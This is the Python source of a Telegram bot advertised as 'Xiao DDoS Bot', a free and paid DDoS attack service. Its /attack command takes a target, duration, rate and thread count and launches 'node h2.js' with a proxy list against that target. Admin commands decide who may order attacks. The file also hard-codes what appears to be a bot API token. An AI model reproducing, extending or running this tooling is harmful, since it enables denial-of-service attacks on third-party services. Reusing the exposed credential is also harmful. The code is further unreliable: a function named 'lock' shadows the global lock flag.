from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
import subprocess

TOKEN = '6151599157:AAEXFXPYCjjSpCusnHQeALrbEppY32qQdrc'
ADMIN_ID = 7360500930  # Thay bằng ID của admin
users = set()  # Set để lưu danh sách người dùng được phép
lock = False  # Cờ để kiểm tra trạng thái khóa

async def start(update: Update, context: CallbackContext) -> None:
    await update.message.reply_text(
        'Welcome to Xiao DDoS Bot!\n\n'
        'XiaoNam Bot Free and Paid DDoS Attack Services\n\n'
        'Type /attack to see the attack usage!\n\n'
        '----------------------------------------------\n\n'
        'Best C2/API Of 2024 -> @Xiaocoderz🚀'
    )

async def attack(update: Update, context: CallbackContext) -> None:
    global lock
    if lock and update.message.from_user.id not in users:
        await update.message.reply_text('Access denied. Please contact admin.')
        return

    if len(context.args) != 4:
        await update.message.reply_text('Usage: /attack <TARGET> <TIME> <RATES> <THREAD>')
        return

    target, time, rates, thread = context.args
    proxy_file = 'proxy.txt'

    sender_name = update.message.from_user.full_name  # Lấy tên đầy đủ của người dùng

    # Đưa thông báo ngay lập tức
    await update.message.reply_text(
        f'Attack successfully sent!\n\n'
        f'- 🚀 Target: {target} | Time: {time} | Rates: {rates} | Thread: {thread}\n\n'
        f'👤 Sender: {sender_name}\n\n'
        f'------------------------------------\n\n'
        f'Best C2/API of 2024 -> @Xiaocoderz'
    )

    command = ['node', 'h2.js', target, time, rates, thread, proxy_file]
    
    try:
        # Gọi lệnh thực thi nhưng không cần đợi kết quả
        subprocess.run(command, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        await update.message.reply_text(f'Error: {e}')

async def add_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    if len(context.args) != 1:
        await update.message.reply_text('Usage: /adduser <USER_ID>')
        return

    user_id = int(context.args[0])
    users.add(user_id)
    await update.message.reply_text(f'User {user_id} added successfully.')

async def remove_user(update: Update, context: CallbackContext) -> None:
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    if len(context.args) != 1:
        await update.message.reply_text('Usage: /removeuser <USER_ID>')
        return

    user_id = int(context.args[0])
    users.discard(user_id)
    await update.message.reply_text(f'User {user_id} removed successfully.')

async def lock(update: Update, context: CallbackContext) -> None:
    global lock
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    lock = True
    await update.message.reply_text('Bot is now locked. Only added users can use /attack.')

async def unlock(update: Update, context: CallbackContext) -> None:
    global lock
    if update.message.from_user.id != ADMIN_ID:
        await update.message.reply_text('Access denied. Only admin can use this command.')
        return

    lock = False
    await update.message.reply_text('Bot is now unlocked. Everyone can use /attack.')

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('attack', attack))
    application.add_handler(CommandHandler('adduser', add_user))
    application.add_handler(CommandHandler('removeuser', remove_user))
    application.add_handler(CommandHandler('lock', lock))
    application.add_handler(CommandHandler('unlock', unlock))

    application.run_polling()

if __name__ == '__main__':
    main()
